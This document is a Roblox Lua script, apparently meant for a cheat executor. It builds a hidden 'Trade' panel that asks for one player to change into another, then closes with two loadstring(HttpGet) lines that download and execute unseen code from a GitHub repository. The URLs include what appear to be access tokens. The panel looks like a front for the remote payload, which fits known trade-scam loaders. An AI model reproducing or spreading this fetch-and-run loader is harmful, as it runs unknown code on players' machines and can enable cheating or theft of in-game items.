-- Gui to Lua
-- Version: 3.2

-- Instances:

local Trade = Instance.new("ScreenGui")
Trade.Enabled = false

local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local BoxFrom = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")
local BoxTo = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local OK = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")

--Properties:

Trade.Name = "Trade"
Trade.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Trade.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = Trade
Frame.BackgroundColor3 = Color3.fromRGB(221, 20, 97)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.690394521, 0, 0.0265017655, 0)
Frame.Size = UDim2.new(0.296026289, 0, 0.257950485, 0)
Frame.Visible = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(232, 0, 240)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0183683392, 0, 0.0456821397, 0)
Frame_2.Size = UDim2.new(0.962548614, 0, 0.914343417, 0)

UICorner.Parent = Frame_2

Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(148, 0, 0)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.0304492824, 0, 0.0913442522, 0)
Main.Size = UDim2.new(0.938895345, 0, 0.823019147, 0)
Main.ZIndex = 2

UICorner_2.Parent = Main

BoxFrom.Name = "BoxFrom"
BoxFrom.Parent = Main
BoxFrom.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BoxFrom.BorderColor3 = Color3.fromRGB(0, 0, 0)
BoxFrom.BorderSizePixel = 0
BoxFrom.Position = UDim2.new(0.0308570191, 0, 0.076286681, 0)
BoxFrom.Size = UDim2.new(0, 360, 0, 50)
BoxFrom.Font = Enum.Font.Unknown
BoxFrom.PlaceholderColor3 = Color3.fromRGB(0, 3, 178)
BoxFrom.PlaceholderText = "Enter player to change"
BoxFrom.Text = ""
BoxFrom.TextColor3 = Color3.fromRGB(0, 0, 0)
BoxFrom.TextScaled = true
BoxFrom.TextSize = 14.000
BoxFrom.TextWrapped = true

UICorner_3.Parent = BoxFrom

BoxTo.Name = "BoxTo"
BoxTo.Parent = Main
BoxTo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BoxTo.BorderColor3 = Color3.fromRGB(0, 0, 0)
BoxTo.BorderSizePixel = 0
BoxTo.Position = UDim2.new(0.393427014, 0, 0.547877073, 0)
BoxTo.Size = UDim2.new(0, 219, 0, 50)
BoxTo.Font = Enum.Font.Unknown
BoxTo.PlaceholderColor3 = Color3.fromRGB(0, 3, 178)
BoxTo.PlaceholderText = "Enter the player to change to"
BoxTo.Text = ""
BoxTo.TextColor3 = Color3.fromRGB(0, 0, 0)
BoxTo.TextScaled = true
BoxTo.TextSize = 14.000
BoxTo.TextWrapped = true

UICorner_4.Parent = BoxTo

OK.Name = "OK"
OK.Parent = Main
OK.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
OK.BorderColor3 = Color3.fromRGB(0, 0, 0)
OK.BorderSizePixel = 0
OK.Position = UDim2.new(0.0308570191, 0, 0.547877073, 0)
OK.Size = UDim2.new(0, 127, 0, 50)
OK.Font = Enum.Font.SourceSans
OK.Text = "OG"
OK.TextColor3 = Color3.fromRGB(8, 0, 229)
OK.TextScaled = true
OK.TextSize = 14.000
OK.TextWrapped = true

UICorner_5.Parent = OK

loadstring(game:HttpGet("https://raw.githubusercontent.com/TheF1rstT1me/TradeMachine/refs/heads/main/EventInstancer.lua?token=GHSAT0AAAAAADWCXI5R3M3OLFW3GMTN3RXI2M3JRTQ", true))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TheF1rstT1me/TradeMachine/refs/heads/main/Main.lua?token=GHSAT0AAAAAADWCXI5R2C3U3STZ7F4DW6UO2M3JROQ", true))()
